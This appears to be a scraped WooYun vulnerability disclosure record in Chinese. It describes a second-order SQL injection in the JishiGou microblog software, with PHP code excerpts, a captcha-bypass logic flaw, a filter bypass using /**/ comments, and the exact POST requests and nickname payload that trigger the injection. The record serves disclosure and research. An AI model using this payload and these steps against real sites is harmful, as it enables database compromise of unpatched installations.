{"id": 5980, "wybug_id": "wooyun-2013-043394", "wybug_title": "记事狗微博二次注射漏洞", "wybug_corp": "杭州神话", "wybug_author": "Chora", "wybug_date": "2013-11-19 22:57", "wybug_open_date": "2014-02-17 22:57", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-17：\t细节向公众公开  简要描述： 这个漏洞可以写个自动化攻击程序，但是混口饭吃而已，认真你就输了。。。建议贵公司把最新补丁打包到源码安装包里面，不然上次的漏洞有详细利用方法，新用户会受到牵连。官方下的版本，然后去你们官方博客里找了最新的补丁都打上了。 详细说明：  modules/member.mod.php\nfunction DoRegister()\t{\t\t......\t\t/**\t\t * 验证码检查\t\t * 如果开启了注册验证码检查，就校验\t\t */\t\tif ($this->Config['seccode_enable']>1 && $this->Config['seccode_register'] && $this->yxm_title && $this->Config['seccode_pub_key'] && $this->Config['seccode_pri_key']) {//我们可以看到用了&&而不是||，所以在这个页面注册根本不需要注册码，导致了自动化攻击的实现。\t\t\t$YinXiangMa_response=jlogic('seccode')->CheckYXM(@$_POST['add_YinXiangMa_challenge'],@$_POST['add_YXM_level'][0],@$_POST['add_YXM_input_result']);\t\t\tif($YinXiangMa_response != \"true\"){\t\t\t\t$this->Messager(\"验证码输入错误\",-1);\t\t\t}\t\t}\t\t/* 邀请处理 */\t\t$inviter_member = array();\t\t$invite_code = ($this->Post['invite_code'] ? $this->Post['invite_code'] : $this->Get['invite_code']);\t\t$check_result = jsg_member_register_check_invite($invite_code);\t\tif($regstatus['invite_enable'] && !$regstatus['normal_enable'])\t\t{\t\t\tif(!$invite_code)\t\t\t{\t\t\t\t$this->Messager(\"本站目前需要有好友邀请链接才能注册。<br><br>看看<a href=\\\"?mod=topic&code=top\\\">达人榜</a>中有没有你认识的人，让他给你发一个好友邀请。\", null);\t\t\t}\t\t\tif(!$check_result)\t\t\t{\t\t\t\t$this->Messager(\"对不起，您访问的邀请链接不正确或者因邀请数已满而失效，请重新与邀请人索取链接。\", null);\t\t\t}\t\t}\t\tif($check_result['uid'] > 0)\t\t{\t\t\t$inviter_member = jsg_member_info($check_result['uid']);\t\t}\t\tif(!$inviter_member && $this->Config['register_invite_input'])\t\t{\t\t\t$inviter_member = jsg_member_info($this->Post['inviter_nickname'], 'nickname');\t\t}\t\t/* 接收变量 */\t\t$password = $this->Post['password'];\t\t$email = $this->Post['email'];\t\t$username = $nickname = $this->Post['nickname'];\t\t/* 密码过滤 */\t\tif(strlen($password) < 5) {\t\t\t$this->Messager(\"密码过短，请设置至少5位\",-1);\t\t}\t\tif($password != $this->Post['password2']) {\t\t\t$this->Messager(\"两次输入的密码不相同\",-1);\t\t}\t\tif($GLOBALS['_J']['plugins']['func']['reg']) {\t\t\thookscript('reg', 'funcs', array('param' => $this->Post, 'step' => 'check'), 'reg');\t\t}\t\t/* 进行注册 */\t\t$uid = jsg_member_register($nickname, $password, $email);//跟进0x01......\t}\ninclude/class/passport.class.php\nfunction register($nickname, $password, $email, $username = '', $ucuid = 0, $role_id = 0) {\t\t......\t\t$nickname = trim(strip_tags($nickname));\t\t$jsg_result = $this->checkname($nickname, 1, $ucuid);//跟进\t\tif($jsg_result < 1) {\t\t\treturn $jsg_result;......\t\t$timestamp = time();\t\t$sql_datas = array();\t\t$sql_datas['ucuid'] \t= $ucuid;\t\t$sql_datas['salt']\t\t= jsg_member_salt();\t\t$sql_datas['password']\t= jsg_member_password($password, $sql_datas['salt']);\t\t$sql_datas['nickname']\t= $nickname;\t\t$sql_datas['username']  = ($username ? $username : '');\t\t$sql_datas['email'] \t= $email;\t\t$sql_datas['role_type']\t= 'normal';\t\t$sql_datas['role_id'] \t= (int) ($GLOBALS['_J']['config']['reg_email_verify'] ? $GLOBALS['_J']['config']['no_verify_email_role_id'] : $GLOBALS['_J']['config']['normal_default_role_id']);\t\t$sql_datas['invitecode']= substr(md5(random(32)),-16);\t\t$sql_datas['regdate']\t= $sql_datas['lastactivity'] = $timestamp;\t\t$sql_datas['regip']\t\t= $sql_datas['lastip'] = $ip;\t\t\t\tif ($GLOBALS['_J']['config']['extcredits_enable'])\t\t{\t\t\t$credits = ConfigHandler::get('credits');\t\t\tforeach ($credits['ext'] as $_k=>$_v)\t\t\t{\t\t\t\tif ($_v['enable'] && $_v['default'])\t\t\t\t{\t\t\t\t\t$sql_datas[$_k] = (int) $_v['default'];\t\t\t\t}\t\t\t}\t\t}\t\t\t\tDB::query(\"insert into `\" . TABLE_PREFIX . \"members` (`\" . implode(\"`,`\", array_keys($sql_datas)) . \"`) values ('\".implode(\"','\",$sql_datas).\"')\"); //这里入库。......\t}function checkname($username, $is_nickname = 0, $ucuid = 0, $check_exists = -1) {\t\t$username = trim(strip_tags($username));\t\t\t\t$username_len = jstrlen($username);\t\t$ulmax = ($is_nickname && true !== UCENTER ? 50 : 15);//50位足够利用，只要你的语句足够短，所以该例我用了一个回显的注入，而不是盲注，那样就能增加可用数量。        $nickname_length = (int) $GLOBALS['_J']['config']['nickname_length'];        $is_nickname && $ulmax = !$nickname_length ? $ulmax : ($nickname_length >$ulmax ? $ulmax : $nickname_length);\t\tif($username_len < 3 || $username_len > $ulmax)\t\t{\t\t\treturn -1;\t\t}\t\t\t\tif($ucuid < 1)\t\t{\t\t\t\t\t\tif(is_numeric($username)) {\t\t\t\treturn -1;\t\t\t}\t\t\t\t\t\tif($is_nickname)\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\tif(false != preg_match('~[\\<\\>\\?\\@\\$\\#\\[\\]\\{\\}\\s]+~',$username)) //虽然过滤了空格跟其他字符，但是我们可以提交/**/来绕过。\t\t\t\t{\t\t\t\t\treturn -1;\t\t\t\t}\t\t\t\t\t\t\t}\t\t\telse\t\t\t{\t\t\t\t\t\t\t\tif((false == preg_match('~^[\\w\\d\\_]+$~',$username)))\t\t\t\t{\t\t\t\t\treturn -1;\t\t\t\t}\t\t\t}\t\t}......\t}\nmodules/ajax/pm.mod.php\nfunction send()\t{\t\t$uid = intval($this->Post['uid']);\t\t\t\t$member = DB::fetch_first(\"SELECT nickname FROM \".DB::table(\"members\").\" WHERE uid='{$uid}'\");\t\tif (empty($member)) {\t\t\tMobile::error(\"No User\", 300);\t\t}\t\t$to_user = $member['nickname']; //出库\t\t$data = array(\t\t\t'to_user' => $to_user,\t\t\t'message' => trim($this->Post['message']),\t\t);\t\t$ret = $this->MyPmLogic->pmSend($data);//跟进0x02\t\tif ($ret == 0) {\t\t\tMobile::success(\"Success\");\t\t} else if ($ret == 1) {\t\t\tMobile::error(\"Content not emtpy\", 420);\t\t} else if ($ret == 2) {\t\t\tMobile::error(\"Content not emtpy\", 321);\t\t} else if (ret == 3) {\t\t\tMobile::error(\"Content not emtpy\", 321);\t\t}\t\tMobile::error(\"Unkonw error\", 250);\t}\ninclude/logic/pm.logic.php 0x02\nfunction pmSend($post,$suid=MEMBER_ID,$susername=MEMBER_NAME,$snickname=MEMBER_NICKNAME){\t\t\t\tif(jaccess('pm','send', $suid)==false) {\t\t\treturn 6;\t\t}\t\t$to_user_list=array();\t\t$f_rets = filter($post['message']);\t\tif($f_rets)\t\t{\t\t\tif($f_rets['error'])\t\t\t{\t\t\t\treturn $f_rets['msg'];\t\t\t}\t\t}\t\t$post['subject']=jhtmlspecialchars(trim($post['subject']));\t\tif($post['message']=='')\t\t{\t\t\treturn 1;\t\t}\t\tif ($post['buddy_list']==false && $post['to_user']==\"\")\t\t{\t\t\treturn 2;\t\t}\t\tif(trim($post['to_user'])!='')\t\t{\t\t\t$in=$this->DatabaseHandler->BuildIn($post['to_user'],\"nickname\");\t\t\t\t\t\t\t\t\t$sql=\"\t\t\tSELECT\t\t\t\t`uid`,`username`,`nickname`,`notice_pm`,`email`,`email_checked`,`newpm`,`at_new`,`event_new`,`fans_new`,`vote_new`,`qun_new`,`dig_new`,`channel_new`,`comment_new`,`user_notice_time`,`lastactivity`\t\t\tFROM\t\t\t\t\".TABLE_PREFIX.'members'.\"\t\t\tWHERE\t\t\t\t$in\";\t\t\t$query = $this->DatabaseHandler->Query($sql);//引入引号进行注入。\t\t\twhile($row=$query->GetRow())\t\t\t{......\t}\nPOSTemail=www@wooyun.org&password=12345&password2=12345&nickname=woo到http://localhost/jishigou/index.php?mod=member&code=doregister先注册一个woo用户，用于回显。然后POSTemail=Chora@wooyun.org&password=12345&password2=12345&nickname=woo')and/**/1=1/**/and('1到http://localhost/jishigou/index.php?mod=member&code=doregister引入注入语句。然后访问自己的主页，查看自己的UID。最后POSTuid=你的UID&message=wooyun到http://localhost/jishigou/mobile/ajax.php?mod=pm&code=send出发注入。   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  包养不动了。。。   版权声明：转载请注明来源 Chora@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-11-21 17:13 厂商回复： 非常感谢 Chora@乌云 的反馈，正在修理了。。。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-20 10:24 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  哈哈哈，宝贝，不要生气了。那些不在补丁里说明来源感谢作者的公司都很无良，@xsser 通用型走起！？    \n     2013-11-20 12:27 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @小胖子 搞起    \n     2013-12-11 17:56 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  一口气看完了，宝贝，追踪动态参数真是个累人的活，xsser给你发了多少奖金来着？    \n     2013-12-11 20:04 |    \t\tChora \t\t\t( 普通白帽子  |\t\t\t        Rank:337 漏洞数:22        | 生存、生活、生命。)\t\t \n  @小胖子 大宝贝，这是苦逼干的活啊，只够饭钱啊，哪像你众测搞这么多，还有小姐包。福利好啊求带。    \n     2013-12-17 00:34 |    \t\tdoor \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 没什么说明)\t\t \n  能拿shell？希望帖个最新版拿shell的     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}